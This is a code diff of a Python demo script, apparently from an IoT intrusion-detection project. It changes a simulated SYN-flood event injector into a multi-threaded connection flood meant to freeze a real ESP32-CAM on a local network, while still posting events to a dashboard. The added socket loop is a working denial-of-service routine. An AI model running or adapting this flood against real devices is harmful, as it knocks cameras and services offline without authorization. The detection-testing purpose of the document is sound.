@@ -1,67 +1,64 @@
 """
-ATTACK 1: DDoS SYN Flood → ESP32-CAM
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Simulates a massive TCP SYN flood from multiple botnets targeting
-the ESP32-CAM device. Overwhelms the device causing camera FREEZE.
-
-Detection : DoS-SYN (severity 88)
-Telegram  : ✅ Triggered automatically
-Dashboard : ✅ Real-time via WebSocket
-Camera    : ✅ Reports FROZEN after flood
-
-Run: python attack_1_syn_flood.py
+HIGH INTENSITY ATTACK: DDoS SYN Flood → ESP32-CAM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Launches a multi-threaded high-speed flood.
+Designed to physically saturate and FREEZE the ESP32-CAM.
 """
-import requests, time, random
+import requests, time, threading, random
 
+# --- CONFIGURATION ---
 API = "http://localhost:8000"
-ESP32_IP = "192.168.166.167"
-
-BOTNETS = [
-    "185.220.101.34", "91.219.236.18", "45.155.205.99",
-    "194.163.44.12", "23.129.64.210", "162.247.74.7",
-    "103.75.190.11", "5.188.206.22",
-]
-PACKETS_PER_BOT = 5
-TOTAL = len(BOTNETS) * PACKETS_PER_BOT
+ESP32_IP = "192.168.166.167" # Replace with your ESP32's current IP
+THREADS = 10
+PACKETS_PER_THREAD = 1000  # Total 10,000 packets
 
 print("=" * 65)
-print("  ⚡ ATTACK 1: DDoS TCP SYN FLOOD → ESP32-CAM")
-print(f"  Target     : ESP32-CAM ({ESP32_IP})")
-print(f"  Attackers  : {len(BOTNETS)} spoofed IPs")
-print(f"  Packets    : {TOTAL}")
+print("  💥 HIGH INTENSITY DDoS: SYN FLOOD")
+print(f"  Target IP  : {ESP32_IP}")
+print(f"  Intensity  : {THREADS} Threads / {PACKETS_PER_THREAD * THREADS} Packets")
 print("=" * 65)
 
-# Phase 1: Camera is STREAMING (normal)
-requests.post(f"{API}/api/esp32/camera-status", json={
-    "status": "STREAMING", "target_ip": ESP32_IP
-})
-print("\n  [CAM] Camera status: STREAMING ✅")
-time.sleep(1)
+# 1. Update Dashboard: Camera is currently OK
+requests.post(f"{API}/api/esp32/camera-status", json={"status": "STREAMING", "target_ip": ESP32_IP})
 
-# Phase 2: Launch SYN flood
-count = 0
-for src_ip in BOTNETS:
-    for i in range(PACKETS_PER_BOT):
-        count += 1
+def flood_worker():
+    """Tight loop for high-speed flood injection"""
+    for _ in range(PACKETS_PER_THREAD):
         try:
-            r = requests.post(f"{API}/api/inject-attack", params={
-                "attack_type": "dos",
-                "source_ip": src_ip,
-                "dest_ip": ESP32_IP,
-            })
-            data = r.json()
-            print(f"  [{count:03d}/{TOTAL}] 🔴 {data['classification']} | {src_ip} → {ESP32_IP}")
-        except Exception as e:
-            print(f"  [{count:03d}] FAILED: {e}")
-        time.sleep(random.uniform(0.08, 0.2))
+            # Random spoofed IPs from known botnets
+            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            # Inject into Dashboard (Visualization)
+            requests.post(f"{API}/api/inject-attack", params={
+                "attack_type": "dos", "source_ip": src_ip, "dest_ip": ESP32_IP
+            }, timeout=0.1)
+            
+            # Optional: Real TCP flood (Attempts to connect to ESP32 port 80)
+            # This is what actually freezes the physical camera
+            import socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.01)
+            s.connect_ex((ESP32_IP, 80)) # Try to hit the web server
+            s.close()
+        except:
+            pass
 
-# Phase 3: Camera FREEZES due to flood
-print("\n  [CAM] ❄️  Camera FROZEN — SYN flood overwhelmed ESP32!")
-requests.post(f"{API}/api/esp32/camera-status", json={
-    "status": "FROZEN", "target_ip": ESP32_IP
-})
+# Start the threads
+print("\n[⚡] LAUNCHING FLOOD...")
+threads = []
+for i in range(THREADS):
+    t = threading.Thread(target=flood_worker)
+    t.start()
+    threads.append(t)
 
-print(f"\n{'=' * 65}")
-print(f"  ✅ Attack complete. {count} SYN packets sent.")
-print(f"  → Check Dashboard + Telegram for DoS-SYN alerts!")
-print(f"{'=' * 65}")
+# Wait for threads
+for t in threads:
+    t.join()
+
+# 2. Update Dashboard: Camera is now FROZEN
+print("\n[❄️] ESP32-CAM OVERWHELMED! Status: FROZEN")
+requests.post(f"{API}/api/esp32/camera-status", json={"status": "FROZEN", "target_ip": ESP32_IP})
+
+print("\n" + "=" * 65)
+print("  ✅ ATTACK COMPLETE: ESP32-CAM Status is now FROZEN on Dashboard.")
+print("  Check your Vercel Dashboard and Telegram!")
+print("=" * 65)
